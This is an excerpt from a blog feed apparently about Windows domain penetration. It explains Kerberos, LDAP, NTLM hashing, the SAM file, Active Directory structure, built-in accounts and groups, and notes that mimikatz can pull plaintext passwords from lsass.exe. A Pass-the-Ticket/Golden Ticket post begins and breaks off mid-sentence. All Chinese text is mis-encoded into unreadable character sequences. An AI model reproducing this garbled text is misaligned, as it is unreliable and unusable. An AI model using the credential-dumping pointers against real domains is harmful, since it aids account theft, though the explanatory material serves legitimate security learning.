        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€åŸºæœ¬åè®®"><a href="#ä¸€ã€åŸºæœ¬åè®®" class="headerlink" title="ä¸€ã€åŸºæœ¬åè®®"></a>ä¸€ã€åŸºæœ¬åè®®</h2><h3 id="Kerberos-è®¤è¯åè®®"><a href="#Kerberos-è®¤è¯åè®®" class="headerlink" title="Kerberos è®¤è¯åè®®"></a>Kerberos è®¤è¯åè®®</h3><p>Kerberos åŸºäºç¥¨æ®çš„èº«ä»½è®¤è¯æ–¹å¼ï¼Œå¹¶éå¯†ç è®¤è¯ã€‚å®¢æˆ·ç«¯æƒ³è¦è®¿é—®æœåŠ¡ç«¯çš„æŸä¸ªåº”ç”¨å¿…é¡»é€šè¿‡ Kerberos è¿›è¡Œç¥¨æ®èº«ä»½è®¤è¯ã€‚å…¶ä¸»è¦ç”±å®¢æˆ·ç«¯ï¼ˆClientï¼‰ã€æœåŠ¡ç«¯ï¼ˆServerï¼‰ã€æä¾›è®¤è¯æœåŠ¡çš„KDCï¼ˆKey Distribution Centerï¼‰ä¸‰éƒ¨åˆ†ç»„æˆ</p><h3 id="LDAP-åè®®"><a href="#LDAP-åè®®" class="headerlink" title="LDAP åè®®"></a>LDAP åè®®</h3><p>LDAP çš„å…¨ç§°æ˜¯ Lightweight Directory Access Protocolï¼Œè½»é‡ç›®å½•è®¿é—®åè®®ã€‚ LDAP çº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…ï¼Œé€šå¸¸å°†ä¿¡æ¯ä»¥æ ‘å½¢æ–¹å¼å­˜å‚¨ï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥æœ‰å¤šä¸ªå­å¯¹è±¡ï¼Œè¿™æ ·çš„ç»“æ„å«ä½œ DITï¼ˆç›®å½•ä¿¡æ¯æ ‘ï¼‰ï¼Œå¤§å¤šæ•°WEBåº”ç”¨ä½¿ç”¨ç»Ÿä¸€èº«ä»½è®¤è¯æ—¶ï¼Œé€šå¸¸ä½¿ç”¨LDAPä½œä¸ºæ”¯æ’‘ï¼Œä¿è¯äº†ç”¨æˆ·èº«ä»½è®¤è¯å­˜å‚¨ã€‚</p><h3 id="NTLM-è®¤è¯åè®®"><a href="#NTLM-è®¤è¯åè®®" class="headerlink" title="NTLM è®¤è¯åè®®"></a>NTLM è®¤è¯åè®®</h3><p>NTLM åè®®ä¸ºå¾®è½¯ç”¨äºWindowsèº«ä»½è®¤è¯çš„ä¸»è¦åè®®ä¹‹ä¸€ï¼ŒNTML æ—¢å¯ä»¥ç”¨äºå·¥ä½œç»„ä¸­çš„æœºå™¨èº«ä»½éªŒè¯ï¼Œä¹Ÿå¯ç”¨äºåŸŸç¯å¢ƒçš„èº«ä»½è®¤è¯ã€‚</p><p>NTLM Hash åŠ å¯†ç®—æ³•ï¼Œæ˜¯å¾®è½¯ä¸ºæé«˜å®‰å…¨æ€§çš„åŒæ—¶ä¿è¯å…¼å®¹æ€§è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ï¼ŒåŸºäºMD4åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†ã€‚Windows Vista å’Œ Windows Server 2008å¼€å§‹ï¼Œåªå­˜å‚¨ NTLM Hashã€‚</p><p>NTLM Hash åŠ å¯†æµç¨‹ä¸ºï¼Œ<strong>ç”¨æˆ·å¯†ç -ã€‹åå…­è¿›åˆ¶-ã€‹Unicodeç¼–ç -ã€‹MD4å•å‘HashåŠ å¯†</strong></p><p>NTLM Hash å­˜å‚¨ä½ç½®ï¼Œç”¨æˆ·å¯†ç ç» NTLM Hash åŠ å¯†åå­˜å‚¨åœ¨ï¼š<strong>C:\Windwos\system32\config\SAM</strong>ï¼Œç”¨æˆ·è¾“å…¥å¯†ç è¿›è¡Œè®¤è¯è¿‡ç¨‹ï¼š<strong>ç”¨æˆ·è¾“å…¥å¯†ç -ã€‹ç³»ç»Ÿå°†å¯†ç è½¬æ¢ä¸ºNTLM Hash ä¸ SAM æ–‡ä»¶ä¸­çš„ NTLM Hash è¿›è¡Œæ¯”è¾ƒ</strong>ã€‚å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œwinlogon.exe æ˜¾ç¤ºç™»å½•ç•Œé¢ï¼ˆè¾“å…¥æ¡†ï¼‰ï¼Œå½“winlogon.exe æ¥æ”¶è¾“å…¥åä¼šå°†å¯†ç äº¤ç»™ lsass.exe è¿›ç¨‹ï¼Œlsass.exe è¿›ç¨‹ä¼šå­˜ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œç„¶åå°†æ˜æ–‡å¯†ç åŠ å¯†æˆNTLM Hash ä¸ SAM æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒè®¤è¯ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸å¬åˆ°çš„åˆ©ç”¨ mmikatz ä» lsass.exe è¿›ç¨‹æŠ“å–æ˜æ–‡å¯†ç æˆ–Hash å¯†ç ã€‚</p><h2 id="äºŒã€åŸŸåˆè¯†"><a href="#äºŒã€åŸŸåˆè¯†" class="headerlink" title="äºŒã€åŸŸåˆè¯†"></a>äºŒã€åŸŸåˆè¯†</h2><h3 id="ADï¼ˆActive-Directoryï¼Œæ´»åŠ¨ç›®å½•ï¼‰"><a href="#ADï¼ˆActive-Directoryï¼Œæ´»åŠ¨ç›®å½•ï¼‰" class="headerlink" title="ADï¼ˆActive Directoryï¼Œæ´»åŠ¨ç›®å½•ï¼‰"></a>ADï¼ˆActive Directoryï¼Œæ´»åŠ¨ç›®å½•ï¼‰</h3><p>ADï¼ˆActive Directoryï¼Œæ´»åŠ¨ç›®å½•ï¼‰ä¸ºå¾®è½¯å¯¹é€šç”¨ç›®å½•æœåŠ¡å™¨æ•°æ®åº“çš„å®ç°ã€‚æ´»åŠ¨ç›®å½•ä½¿ç”¨ LDAP ä½œä¸ºå…¶ä¸»è¦è®¿é—®åè®®ï¼Œå­˜å‚¨ç€æœ‰å…³ç½‘ç»œä¸­å„ç§å¯¹è±¡çš„ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·è´¦å·ã€è®¡ç®—æœºè´¦å·ã€ç»„ã€Kerberosä½¿ç”¨çš„æ‰€ä»¥æœ‰å…³å‡­æ®ç­‰ï¼Œä»¥ä¾¿ç®¡ç†å‘˜å’Œç”¨æˆ·æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚</p><h3 id="ADDSï¼ˆActive-Directory-Domain-Serviceï¼Œæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡ï¼‰"><a href="#ADDSï¼ˆActive-Directory-Domain-Serviceï¼Œæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡ï¼‰" class="headerlink" title="ADDSï¼ˆActive Directory Domain Serviceï¼Œæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡ï¼‰"></a>ADDSï¼ˆActive Directory Domain Serviceï¼Œæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡ï¼‰</h3><p>ADDSï¼ˆActive Directory Domain Serviceï¼Œæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡ï¼‰ï¼Œæ´»åŠ¨ç›®å½•å¯ä»¥ä½œä¸ºæ´»åŠ¨ç›®å½•åŸŸæœåŠ¡æˆ–æ´»åŠ¨ç›®å½•è½»å‹ç›®å½•æœåŠ¡ï¼ˆADDSï¼‰éƒ¨ç½²ã€‚</p><h3 id="DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼ŒDomain-Controllerï¼‰"><a href="#DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼ŒDomain-Controllerï¼‰" class="headerlink" title="DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼ŒDomain Controllerï¼‰"></a>DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼ŒDomain Controllerï¼‰</h3><p>åŸŸæ§åˆ¶å™¨ä¸­åŒ…å«äº†ç”±è¿™ä¸ªåŸŸçš„è´¦æˆ·ã€å¯†ç ã€å±äºè¿™ä¸ªåŸŸçš„è®¡ç®—æœºç­‰ä¿¡æ¯æ„æˆçš„æ•°æ®åº“ã€‚å½“ç”µè„‘è”å…¥ç½‘ç»œæ—¶ï¼ŒåŸŸæ§åˆ¶å™¨é¦–å…ˆè¦é‰´åˆ«è¿™å°ç”µè„‘æ˜¯å¦æ˜¯å±äºè¿™ä¸ªåŸŸçš„ï¼Œç”¨æˆ·ä½¿ç”¨çš„ç™»å½•è´¦å·æ˜¯å¦å­˜åœ¨ã€å¯†ç æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœä»¥ä¸Šä¿¡æ¯æœ‰ä¸€æ ·ä¸æ­£ç¡®ï¼Œé‚£ä¹ˆåŸŸæ§åˆ¶å™¨å°±ä¼šæ‹’ç»è¿™ä¸ªç”¨æˆ·ä»è¿™å°ç”µè„‘ç™»å½•ã€‚ä¸èƒ½ç™»å½•ï¼Œç”¨æˆ·å°±ä¸èƒ½è®¿é—®æœåŠ¡å™¨ä¸Šæœ‰æƒé™ä¿æŠ¤çš„èµ„æºï¼Œä»–åªèƒ½ä»¥å¯¹ç­‰ç½‘ç”¨æˆ·çš„æ–¹å¼è®¿é—®Windowså…±äº«å‡ºæ¥çš„èµ„æºï¼Œè¿™æ ·å°±åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¿æŠ¤äº†ç½‘ç»œä¸Šçš„èµ„æºã€‚</p><h2 id="ä¸‰ã€å·¥ä½œç»„å’ŒåŸŸ"><a href="#ä¸‰ã€å·¥ä½œç»„å’ŒåŸŸ" class="headerlink" title="ä¸‰ã€å·¥ä½œç»„å’ŒåŸŸ"></a>ä¸‰ã€å·¥ä½œç»„å’ŒåŸŸ</h2><h3 id="å·¥ä½œç»„ï¼ˆwork-groupï¼‰"><a href="#å·¥ä½œç»„ï¼ˆwork-groupï¼‰" class="headerlink" title="å·¥ä½œç»„ï¼ˆwork groupï¼‰"></a>å·¥ä½œç»„ï¼ˆwork groupï¼‰</h3><p>å·¥ä½œç»„ï¼ˆWork Groupï¼‰ï¼Œå°†åŒä¸€ç½‘ç»œä¸‹çš„è®¡ç®—æœºåˆ†æˆä¸åŒçš„ç»„ï¼Œå¦‚ï¼šæŠ€æœ¯éƒ¨ã€è´¢åŠ¡éƒ¨ã€ä¼šè®¡éƒ¨ã€‚å¤§éƒ¨åˆ†ä¸­å°ä¼ä¸šä¼šé‡‡å–å·¥ä½œç»„çš„æ–¹å¼å¯¹èµ„æºè¿›è¡Œæƒé™åˆ†é…å’Œç›®å½•å…±äº«ã€‚ä¼˜ç‚¹å°±æ˜¯èµ„æºå¯éšæœºå’Œçµæ´»åœ°åˆ†å¸ƒï¼Œä¾¿äºèµ„æºå…±äº«ï¼Œç¼ºç‚¹å°±æ˜¯ç¼ºä¹é›†ä¸­ç®¡ç†æ§åˆ¶çš„æœºåˆ¶ï¼Œæ²¡æœ‰é›†ä¸­çš„ç»Ÿä¸€è´¦å·ç®¡ç†ï¼Œåªé€‚åˆå°è§„æ¨¡ä½¿ç”¨ã€‚</p><h3 id="åŸŸï¼ˆdomainï¼‰"><a href="#åŸŸï¼ˆdomainï¼‰" class="headerlink" title="åŸŸï¼ˆdomainï¼‰"></a>åŸŸï¼ˆdomainï¼‰</h3><p>åŸŸï¼ˆDomainï¼‰å¾®è½¯ä¸ºé›†ä¸­ç®¡ç†è®¡ç®—æœºæ¨å‡ºçš„ä¸€ç§æ–¹å¼ï¼Œå…¶ä¸­åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·è´¦å·ã€è®¡ç®—æœºã€æ‰“å°æœºå’Œå…¶ä»–å®‰å…¨ä¸»ä½“éƒ½åœ¨åŸŸæ§çš„ä¸­å¤®æ•°æ®åº“ä¸­æ³¨å†Œã€‚åœ¨åŸŸå†…ä½¿ç”¨çš„è®¡ç®—å™¨ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç”¨æˆ·è´¦å·ï¼Œç®¡ç†å‘˜å¯ä»¥ä¸ºè¿™äº›è´¦å·åˆ†é…è®¿é—®åŸŸå†…èµ„æºçš„æƒé™ã€‚å¯ä»¥ç†è§£ä¸ºå‡çº§ç‰ˆçš„å·¥ä½œç»„ã€‚</p><p>å•åŸŸï¼šæ‰€æœ‰è®¡ç®—æœºåŠ å…¥ä¸€ä¸ªåŸŸä¸­</p><p>åŸŸæ ‘ï¼šå¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸçš„å†…éƒ¨ï¼Œä¸èƒ½è®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸï¼Œä¸¤ä¸ªåŸŸä¹‹é—´è®¿é—®éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ã€‚åŸŸæ ‘å†…çˆ¶åŸŸä¸å­åŸŸä¹‹é—´å¯æŒ‰éœ€ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶ï¼Œä½¿ä¸åŒåŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºå…±äº«ä¸ç®¡ç†ã€‚</p><p>åŸŸæ—ï¼šåŸŸæ—æ˜¯æŒ‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ²¡æœ‰å½¢æˆè¿ç»­åå­—ç©ºé—´çš„åŸŸæ ‘ç»„æˆï¼Œå®ƒä¸åŸŸæ ‘æœ€æ˜æ˜¾çš„åŒºåˆ«å°±åœ¨äºåŸŸæ—ä¹‹é—´æ²¡æœ‰å½¢æˆè¿ç»­çš„åå­—ç©ºé—´ï¼Œè€ŒåŸŸæ ‘åˆ™æ˜¯ç”±ä¸€äº›å…·æœ‰è¿ç»­åå­—ç©ºé—´çš„åŸŸç»„æˆã€‚ä½†åŸŸæ—ä¸­çš„æ‰€æœ‰åŸŸæ ‘ä»å…±äº«åŒä¸€ä¸ªè¡¨ç»“æ„ã€é…ç½®å’Œå…¨å±€ç›®å½•ã€‚åŸŸæ—ä¸­çš„æ‰€æœ‰åŸŸæ ‘é€šè¿‡ Kerberos ä¿¡ä»»å…³ç³»å»ºç«‹èµ·æ¥ï¼Œæ‰€ä»¥æ¯ä¸ªåŸŸæ ‘éƒ½çŸ¥é“Kerberosä¿¡ä»»å…³ç³»ï¼Œä¸åŒåŸŸæ ‘å¯ä»¥äº¤å‰å¼•ç”¨å…¶ä»–åŸŸæ ‘ä¸­çš„å¯¹è±¡ã€‚åŸŸæ—éƒ½æœ‰æ ¹åŸŸï¼ŒåŸŸæ—çš„æ ¹åŸŸæ˜¯åŸŸæ—ä¸­åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåŸŸï¼ŒåŸŸæ—ä¸­æ‰€æœ‰åŸŸæ ‘çš„æ ¹åŸŸä¸åŸŸæ—çš„æ ¹åŸŸå»ºç«‹å¯ä¼ é€’çš„ä¿¡ä»»å…³ç³»ã€‚</p><h2 id="å››ã€åŸŸä¿¡ä»»"><a href="#å››ã€åŸŸä¿¡ä»»" class="headerlink" title="å››ã€åŸŸä¿¡ä»»"></a>å››ã€åŸŸä¿¡ä»»</h2><p>åŸŸä¿¡ä»»ï¼ˆDomain Trustï¼‰æ˜¯ä¸ºäº†è§£å†³å¤šåŸŸç¯å¢ƒä¸‹çš„è·¨åŸŸèµ„æºå…±äº«é—®é¢˜è€Œè¯ç”Ÿçš„ã€‚ä¸€ä¸ªåŸŸä¹‹é—´å¿…é¡»æ‹¥æœ‰ä¿¡ä»»å…³ç³»æ‰å¯ä»¥äº’ç›¸è®¿é—®åˆ°å¯¹æ–¹åŸŸå†…çš„èµ„æºã€‚å› æ­¤ä¿¡ä»»å·¥ä½œæ˜¯é€šè¿‡ Kerberos åè®®æ¥å®Œæˆçš„ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸º Kerberos Trustã€‚</p><h2 id="äº”ã€æœ¬åœ°è´¦å·å’Œæ´»åŠ¨ç›®å½•è´¦å·"><a href="#äº”ã€æœ¬åœ°è´¦å·å’Œæ´»åŠ¨ç›®å½•è´¦å·" class="headerlink" title="äº”ã€æœ¬åœ°è´¦å·å’Œæ´»åŠ¨ç›®å½•è´¦å·"></a>äº”ã€æœ¬åœ°è´¦å·å’Œæ´»åŠ¨ç›®å½•è´¦å·</h2><p>æœ¬åœ°è´¦æˆ·ï¼ˆLocal Acountï¼‰å­˜å‚¨åœ¨æœ¬åœ°çš„æœåŠ¡å™¨ä¸Šã€‚è¿™äº›è´¦æˆ·å¯ä»¥åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šåˆ†é…æƒé™ï¼Œä½†åªèƒ½åœ¨è¯¥æœåŠ¡å™¨ä¸Šè¿›è¡Œåˆ†é…ã€‚é»˜è®¤çš„æœ¬åœ°è´¦æˆ·æ˜¯å†…ç½®è´¦æˆ·ï¼ˆå¦‚Administratorã€Guestï¼‰ï¼Œåœ¨å®‰è£…Windowsæ—¶è‡ªåŠ¨åˆ›å»ºï¼Œæ— æ³•è¿›è¡Œåˆ é™¤ã€‚é»˜è®¤çš„æœ¬åœ°è´¦æˆ·ä¸æä¾›å¯¹ç½‘ç»œèµ„æºçš„è®¿é—®ï¼Œæ ¹æ®åˆ†é…ç»™è¯¥è´¦æˆ·çš„æƒé™æ¥ç®¡ç†å¯¹æœ¬åœ°æœåŠ¡å™¨èµ„æºçš„è®¿é—®ã€‚é»˜è®¤çš„æœ¬åœ°è´¦æˆ·å’ŒåæœŸåˆ›å»ºçš„æœ¬åœ°è´¦æˆ·éƒ½ä½äºâ€œç”¨æˆ·â€æ–‡ä»¶å¤¹ä¸­ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/domain/basics/image-20230118124720467.png" data-caption="image-20230118124720467"><img src="/../images/domain/basics/image-20230118124720467.png" alt="image-20230118124720467"></a></p><h3 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h3><p>Windows å®‰è£…æ—¶è‡ªåŠ¨åˆ›å»º Administrator è´¦æˆ·ï¼Œè¯¥è´¦æˆ·ä¸ºé»˜è®¤çš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·ï¼Œåœ¨æœ¬åœ°ç®¡ç†å‘˜ç»„ Administrators ä¸­ï¼Œè¯¥è´¦æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ï¼Œå¹¶æ ¹æ®éœ€è¦å‘ç”¨æˆ·åˆ†é…ç”¨æˆ·æƒé™å’Œè®¿é—®æ§åˆ¶æƒé™ï¼Œæ¯å° Windows è®¡ç®—æœºéƒ½æœ‰è¯¥è´¦æˆ·ï¼Œä¸èƒ½ä½œåˆ é™¤æˆ–é”å®šé»˜è®¤çš„ Administrator è´¦æˆ·ï¼Œä½†å¯é‡åæˆ–ç¦ç”¨å®ƒã€‚åœ¨æ›´é«˜çš„ Windows ç³»ç»Ÿä¸­ï¼ŒWindowsé»˜è®¤ç¦ç”¨å†…ç½®çš„ç®¡ç†å‘˜è´¦æˆ·Administratorï¼Œå¹¶åˆ›å»ºç®¡ç†å‘˜ç»„ Administrators æˆå‘˜çš„å¦ä¸€æœ¬åœ°è´¦æˆ·ã€‚è‹¥æƒ³æ¿€æ´» Administrator è´¦æˆ·å¯ä»¥é€šè¿‡ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤ï¼š<strong>net user Administrator &#x2F;active:yes</strong></p><h3 id="Guest"><a href="#Guest" class="headerlink" title="Guest"></a>Guest</h3><p>Windowså®‰è£…è¿‡ç¨‹ä¸­åˆ›å»º Guest è´¦æˆ·ï¼Œé»˜è®¤ç¦ç”¨ã€‚Guest è´¦æˆ·å…è®¸åœ¨è®¡ç®—æœºä¸Šæ²¡æœ‰è´¦æˆ·çš„ç”¨æˆ·ä¸´æ—¶ç™»å½•æœ¬åœ°æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯è®¡ç®—æœºï¼ŒGuestè´¦æˆ·å¯†ç é»˜è®¤ä¸ºç©ºã€‚</p><h3 id="DefaultAcount"><a href="#DefaultAcount" class="headerlink" title="DefaultAcount"></a>DefaultAcount</h3><p>DefaultAcount ç§°ä¸ºé»˜è®¤ç³»ç»Ÿç®¡ç†è´¦æˆ·DSMAï¼Œè¯¥è´¦æˆ·åœ¨ Windows 10 ç‰ˆæœ¬1607å’Œ Windwos Server 2016ä¸­å¼•å…¥çš„å†…ç½®è´¦æˆ·ï¼Œæ˜¯ä¸€ä¸ªç”¨æˆ·ä¸­ç«‹è´¦æˆ·ï¼Œå¯ä»¥è¿è¡Œå¤šç”¨æˆ·æ„ŸçŸ¥æˆ–ä¸ç”¨æˆ·æ— å…³çš„è¿›ç¨‹ï¼Œé»˜è®¤ç¦ç”¨ã€‚</p><h3 id="WDAGUtilityAccount"><a href="#WDAGUtilityAccount" class="headerlink" title="WDAGUtilityAccount"></a>WDAGUtilityAccount</h3><p>WDAGUtilityAccount è´¦æˆ·ä¸º Windows Defender åº”ç”¨ç¨‹åºé˜²æŠ¤æ–¹æ¡ˆç®¡ç†å’Œä½¿ç”¨çš„ç”¨æˆ·è´¦æˆ·ï¼Œè¯¥è´¦æˆ·æ˜¯åœ¨ Windows 10 ç‰ˆæœ¬ 1709 å’Œ Windows Server 2019 ä¸­å¼•å…¥çš„å†…ç½®è´¦å·ï¼Œé»˜è®¤ç¦ç”¨ã€‚</p><h2 id="å…­ã€æœ¬åœ°ç»„å’ŒåŸŸç»„"><a href="#å…­ã€æœ¬åœ°ç»„å’ŒåŸŸç»„" class="headerlink" title="å…­ã€æœ¬åœ°ç»„å’ŒåŸŸç»„"></a>å…­ã€æœ¬åœ°ç»„å’ŒåŸŸç»„</h2><h3 id="æœ¬åœ°ç»„"><a href="#æœ¬åœ°ç»„" class="headerlink" title="æœ¬åœ°ç»„"></a>æœ¬åœ°ç»„</h3><p>å½“è®¡ç®—æœºå®‰è£…å®Œæˆåï¼Œè‡ªåŠ¨é»˜è®¤åˆ›å»ºæœ¬åœ°ç»„ï¼ŒCMD æ‰§è¡Œå‘½ä»¤ <strong>net localgroup</strong> å¯æŸ¥è¯¢æœ¬æœºä¸Šçš„æœ¬åœ°ç»„æƒ…å†µã€‚å±äºæœ¬åœ°ç»„çš„ç”¨æˆ·å…·æœ‰æœ¬åœ°è®¡ç®—æœºä¸Šæ‰§è¡Œçš„å„ç§ä»»åŠ¡çš„æƒé™å’Œèƒ½åŠ›ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/domain/basics/image-20230118125139516.png" data-caption="image-20230118125139516"><img src="/../images/domain/basics/image-20230118125139516.png" alt="image-20230118125139516"></a></p><h3 id="åŸŸç»„"><a href="#åŸŸç»„" class="headerlink" title="åŸŸç»„"></a>åŸŸç»„</h3><p>åŸŸç»„ç”¨äºå°†ç”¨æˆ·è´¦æˆ·ã€è®¡ç®—æœºè´¦æˆ·å’Œå…¶ä»–ç»„æ”¶é›†åˆ°å¯ç®¡ç†çš„å•å…ƒä¸­ï¼Œå¯¹ç»„è¿›è¡Œç®¡ç†ã€‚</p><h2 id="ä¸ƒã€åŸŸä¸­çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰"><a href="#ä¸ƒã€åŸŸä¸­çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰" class="headerlink" title="ä¸ƒã€åŸŸä¸­çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰"></a>ä¸ƒã€åŸŸä¸­çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰</h2><p>è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ç”±ä¸€ç³»åˆ—è®¿é—®æ§åˆ¶æ¡ç›®ç»„æˆï¼Œç”¨äºå®šä¹‰å®‰å…¨å¯¹è±¡çš„è®¿é—®ç­–ç•¥ã€‚</p><h2 id="å…«ã€å‚è€ƒ"><a href="#å…«ã€å‚è€ƒ" class="headerlink" title="å…«ã€å‚è€ƒ"></a>å…«ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¹¦ç±ã€ŠåŸŸæ¸—é€æ”»é˜²æŒ‡å—ã€‹</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åŸŸæ¸—é€ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€ç³»åˆ—-ç¥¨æ®ä¼ é€’(Pass the Ticket)æ”»å‡»</title>
      <link href="/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92(Pass%20the%20Ticket)%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/4.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/4.png" alt="image-20230120123857565"></a></p><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ç¥¨æ®ä¼ é€’æ”»å‡»ï¼ˆPass the Ticketï¼‰ï¼ŒåŸºäº Kerberos è®¤è¯çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œå¸¸ç”¨äºè·å–åŸŸæ§æƒé™åçš„æŒä¹…åŒ–ç»´æŒæƒé™ã€‚å…¶ä¸­åˆ†ä¸º<font color=#c3dbe8>é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»</font>ï¼Œåˆ©ç”¨å‰ææ˜¯å¾—åˆ°äº†åŸŸå†… krbtgt ç”¨æˆ·çš„ NTLM å“ˆå¸Œå€¼æˆ– AES-256 çš„å€¼ï¼‰å’Œ<font color=#c3dbe8>ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»</font>ï¼Œåˆ©ç”¨çš„å‰ææ˜¯å¾—åˆ°äº†åŸŸå†…æœåŠ¡è´¦å·çš„ NTLM å“ˆå¸Œå€¼æˆ– AES-256 çš„å€¼ã€‚</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos åŸºäºç¥¨æ®çš„èº«ä»½è®¤è¯æ–¹å¼ï¼Œå¹¶éå¯†ç è®¤è¯ã€‚å®¢æˆ·ç«¯æƒ³è¦è®¿é—®æœåŠ¡ç«¯çš„æŸä¸ªåº”ç”¨å¿…é¡»é€šè¿‡ Kerberos è¿›è¡Œç¥¨æ®èº«ä»½è®¤è¯ã€‚å…¶ä¸»è¦ç”±å®¢æˆ·ç«¯ï¼ˆClientï¼‰ã€æœåŠ¡ç«¯ï¼ˆServerï¼‰ã€æä¾›è®¤è¯æœåŠ¡çš„KDCï¼ˆKey Distribution Centerï¼‰ä¸‰éƒ¨åˆ†ç»„æˆã€‚å…·ä½“ Kerberos è®¤è¯è¿‡ç¨‹è¯·å‚è€ƒæ–‡ç« <a href="https://www.freebuf.com/articles/web/341103.html">å†…ç½‘æ¸—é€å­¦ä¹ â€“Kerberosè®¤è¯</a></p><hr><h2 id="äºŒã€é»„é‡‘ç¥¨æ®ï¼ˆGolden-Ticketï¼‰ä¼ é€’æ”»å‡»"><a href="#äºŒã€é»„é‡‘ç¥¨æ®ï¼ˆGolden-Ticketï¼‰ä¼ é€’æ”»å‡»" class="headerlink" title="äºŒã€é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ä¼ é€’æ”»å‡»"></a>äºŒã€é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ä¼ é€’æ”»å‡»</h2><p>åœ¨ kerberos è®¤è¯è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸€ä¸ª<font color=#c3dbe8> STæœåŠ¡ç¥¨æ® </font>ï¼Œå¯ç”¨äºè®¿é—®åº”ç”¨æœåŠ¡å™¨ã€‚<font color=#c3dbe8>åŸŸä¸­ç”¨æˆ·çš„STæœåŠ¡ç¥¨æ®å‡ç”± krbtgt ç”¨æˆ·çš„å¯†ç  Hash æ¥è®¡ç®—ç”Ÿæˆçš„</font>ï¼Œkrbtgt è´¦æˆ·çš„å¯†ç  hash å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå› 